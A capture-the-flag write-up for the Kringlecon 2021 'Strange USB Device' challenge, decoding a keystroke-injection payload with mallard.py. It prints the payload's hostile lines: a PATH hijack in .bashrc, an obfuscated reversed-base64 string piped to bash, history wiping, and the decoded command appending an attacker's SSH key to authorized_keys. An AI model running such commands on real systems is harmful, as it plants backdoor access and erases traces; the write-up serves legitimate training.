---
title: Kringlecon 2021 - Strange USB Device
---
# Introduction
This is a challenge with potential to learn alot, or just cruise through for potential CTF points. The description of the challenge is as follows:
Assist the elves in reverse engineering the strange USB device. Visit Santa's Talks Floor and hit up Jewel Loggins for advice.
The flag we are looking for is the trolls username.

# Tools
We are handed a script called mallard.py and a USB device at /mnt/USBDEVICE/. First off, the mallard script. The help page shows the following:
```
elf@cb3fea375384:~$ python mallard.py -h                
usage: mallard.py [-h] [--file FILE] [--no_analyze] [--output_file OUTPUT_FILE]
                  [--analysis_file ANALYSIS_FILE] [--debug]

optional arguments:
  -h, --help            show this help message and exit
  --file FILE, -f FILE  The file to decode, default: inject.bin
```
And the contents of /mnt/USBDEVICE/ is a file called inject.bin.

Well, it seems straight forward. We have a script that takes files (default inject.bin), and a file called inject.bin.
First lets copy the file so we have a backup incase something wrong happens.

# Enumeration
```
elf@cb3fea375384:~$ cp /mnt/USBDEVICE/inject.bin /home/elf/
elf@cb3fea375384:~$ python mallard.py --file inject.bin 
...

STRING echo "export PATH=~/.config/sudo:$PATH" >> ~/.bashrc
ENTER
DELAY 200
STRING echo ==gCzlXZr9FZlpXay9Ga0VXYvg2cz5yL+BiP+AyJt92YuIXZ39Gd0N3byZ2ajFmau4WdmxGbvJHdAB3bvd2Ytl3ajlGILFESV1mWVN2SChVYTp1VhNlRyQ1UkdFZopkbS1EbHpFSwdlVRJlRVNFdwM2SGVEZnRTaihmVXJ2ZRhVWvJFSJBTOtJ2ZV12YuVlMkd2dTVGb0dUSJ5UMVdGNXl1ZrhkYzZ0ValnQDRmd1cUS6x2RJpHbHFWVClHZOpVVTpnWwQFdSdEVIJlRS9GZyoVcKJTVzwWMkBDcWFGdW1GZvJFSTJHZIdlWKhkU14UbVBSYzJXLoN3cnAyboNWZ | rev | base64 -d | bash
ENTER
DELAY 600
STRING history -c && rm .bash_history && exit
ENTER
DELAY 600
GUI q
```
It seems like one of the last things the troll tried to do was so bad he wanted to hide it. He used bash to base64 decrypt a string and run the commands in that string. Lets see what it does. All we need to do is to copy the command and remove bash at the end.
```
echo ==gCzlXZr9FZlpXay9Ga0VXYvg2cz5yL+BiP+AyJt92YuIXZ39Gd0N3byZ2ajFmau4WdmxGbvJHdAB3bvd2Ytl3ajlGILFESV1mWVN2SChVYTp1VhNlRyQ1UkdFZopkbS1EbHpFSwdlVRJlRVNFdwM2SGVEZnRTaihmVXJ2ZRhVWvJFSJBTOtJ2ZV12YuVlMkd2dTVGb0dUSJ5UMVdGNXl1ZrhkYzZ0ValnQDRmd1cUS6x2RJpHbHFWVClHZOpVVTpnWwQFdSdEVIJlRS9GZyoVcKJTVzwWMkBDcWFGdW1GZvJFSTJHZIdlWKhkU14UbVBSYzJXLoN3cnAyboNWZ | rev | base64 -d

echo 'ssh-rsa UmN5RHJZWHdrSHRodmVtaVp0d1l3U2JqZ2doRFRHTGRtT0ZzSUZNdyBUaGlzIGlzIG5vdCByZWFsbHkgYW4gU1NIIGtleSwgd2UncmUgbm90IHRoYXQgbWVhbi4gdEFKc0tSUFRQVWpHZGlMRnJhdWdST2FSaWZSaXBKcUZmUHAK ickymcgoop@trollfun.jackfrosttower.com' >> ~/.ssh/authorized_keys
```
Aha! ickymcgoop wanted to be authurized to ssh himself into the device. Well, that was that.
